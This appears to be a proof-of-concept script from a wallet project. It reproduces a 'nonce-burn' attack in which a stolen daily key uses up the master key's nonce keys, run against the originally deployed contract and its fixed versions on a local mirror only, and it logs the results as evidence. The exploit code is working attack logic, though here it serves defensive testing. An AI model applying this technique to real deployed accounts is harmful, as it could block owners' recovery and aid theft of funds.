/**
 * A thief with only the daily key tries to burn the master key's nonce keys. They are public: keccak(root, leaf).
 * The first deployed `validateDaily` did not look at nonce keys. This attacks a copy of that contract on the mirror, and the fixed ones. It
 * refuses to run anywhere else: it has no business on the public devnet.
 *
 *     vajra nonce-burn         the contract as first deployed, with no fix: artifacts/VajraAccount.pre-fix.json
 *     vajra nonce-burn fixed   VajraAccount as it is now
 *     vajra nonce-burn v2      VajraAccountV2
 */
import { randomBytes } from "node:crypto";
import { readFileSync, writeFileSync } from "node:fs";
import { type Address, type Hex, keccak256, parseEther, toHex } from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import {
  DEVNET,
  ETH,
  type FrameTx,
  LEGACY_GAS_PRICE,
  MasterSigner,
  RpcError,
  WOTS_W16,
  createAccount,
  dailyTx,
  deployments,
  harborCommitment,
  isLocalStack,
  leafNonceKey,
  memoryStore,
  ops,
  publicClient,
  refusalNameV2,
  sendAlt,
  signDailyTx,
  signMasterTx,
  submit,
  waitForSuccess,
  walletFor,
} from "@vajra/core";
import { loadOrCreateKey } from "@vajra/core/node";
import { keyPath } from "./deploy.ts";
import { V2_STAKE } from "./wallet.ts";

if (!isLocalStack) throw new Error("this is an attack: it runs on the local mirror only, with VAJRA_STACK=local");

const v2 = process.argv.includes("v2");
const fixed = process.argv.includes("fixed");
const { w16, v2: zk, genesis } = deployments();
const deployer = loadOrCreateKey(keyPath("deployer.key"));

/** The bytes first deployed, put on the mirror, so that the flaw stays reproducible after the source is fixed. */
async function preFixFactory(): Promise<Address> {
  const load = (name: string) => JSON.parse(readFileSync(new URL(`../../core/src/artifacts/${name}.json`, import.meta.url), "utf8"));
  const wallet = walletFor(deployer);
  const place = async (artifact: { abi: never; bytecode: Hex }, args: unknown[]) => {
    const hash = await wallet.deployContract({ ...artifact, args: args as never, gas: 30_000_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy" });
    return (await waitForSuccess(hash, "placing the pre-fix contract")).contractAddress!;
  };
  return place(load("VajraFactory"), [await place(load("VajraAccount.pre-fix"), [4, 3, DEVNET.stakingRegistry])]);
}

const factory = v2 ? zk!.factory : fixed ? w16.factory : await preFixFactory();
const dailyKey = generatePrivateKey();
const daily = privateKeyToAccount(dailyKey).address;
const signer = new MasterSigner(WOTS_W16, memoryStore(), () => new Uint8Array(randomBytes(32)));
const harbor = privateKeyToAccount(generatePrivateKey()).address;
const salt = keccak256(toHex("harbor"));

const label = v2 ? "VajraAccountV2" : fixed ? "VajraAccount, fixed" : "VajraAccount as first deployed";
const account = await createAccount(
  deployer,
  factory,
  {
    dailyKey: daily,
    wotsRoot: signer.root,
    epochSalt: genesis,
    harborCommitment: harborCommitment(harbor, salt),
    queueDelay: 60n,
    coolingPeriod: 60n,
    maxDailyTxCost: parseEther("0.01"),
    assets: [ETH],
    dailyLimits: [parseEther("0.1")],
    coolingAllowances: [parseEther("0.01")],
    ...(v2 ? { stake: V2_STAKE, unstakeDelay: 86_400 } : {}),
  },
  parseEther("0.5"),
);
console.log(`${label}: ${account}`);

/** A daily-signed no-op, on nonce keys that belong to the master key's leaves. */
async function burn(leaves: number[]): Promise<FrameTx> {
  const tx = dailyTx({ account, dailyKey: daily, nonce: 0n, calls: [ops.spend(ETH, daily, 0n)], verifyGas: 97_000n });
  return signDailyTx({ ...tx, nonceSeq: 0n, nonceKeys: leaves.map((leaf) => leafNonceKey(signer.root, leaf)).sort((x, y) => (x < y ? -1 : 1)) }, dailyKey);
}

const PER_TX = 3;
let burned = 0;
let firstRefusal: string | null = null;
for (let leaf = 0; leaf < 64; leaf += PER_TX) {
  const leaves = Array.from({ length: Math.min(PER_TX, 64 - leaf) }, (_, i) => leaf + i);
  try {
    const { receipt } = await submit(await burn(leaves));
    burned += leaves.length;
    if (leaf === 0) console.log(`leaves ${leaves} burned by the daily key, in block ${Number(BigInt(receipt.blockNumber))}, status ${receipt.status}`);
  } catch (error) {
    const name = error instanceof RpcError ? refusalNameV2(error.message) : String(error);
    firstRefusal = name.slice(0, 200);
    console.log(`daily key on leaves ${leaves}: REFUSED ${firstRefusal}`);
    break;
  }
}
console.log(`${burned} of 64 leaves burned`);

const escape = signMasterTx({ signer, account, epochSalt: genesis, calls: [ops.escape(harbor, salt)], leaf: burned === 64 ? 0 : burned, maxHashes: 660 });
const outcome = await sendAlt(escape.tx).then(
  (hash) => `admitted ${hash}`,
  (error: Error) => `REFUSED ${error instanceof RpcError ? refusalNameV2(error.message).slice(0, 160) : error.message}`,
);
console.log(`the owner's escape, on leaf ${escape.leaf}: ${outcome}`);
console.log(`account balance ${await publicClient.getBalance({ address: account })}, harbor balance ${await publicClient.getBalance({ address: harbor })}`);
writeFileSync(
  new URL(`../../../docs/evidence/nonce-burn-${v2 ? "v2" : fixed ? "fixed-contract" : "deployed-contract"}-latest.json`, import.meta.url),
  JSON.stringify(
    {
      ranAt: new Date().toISOString(),
      stack: "local mirror: ethrex 9aa3645 + sidecar 2e22ff0 with sidecar-budget-010.patch. NOT run on the public devnet",
      chainId: DEVNET.chainId,
      contract: label,
      account,
      leavesBurned: burned,
      firstRefusal,
      escape: outcome,
    },
    null,
    1,
  ) + "\n",
);
process.exit(0);
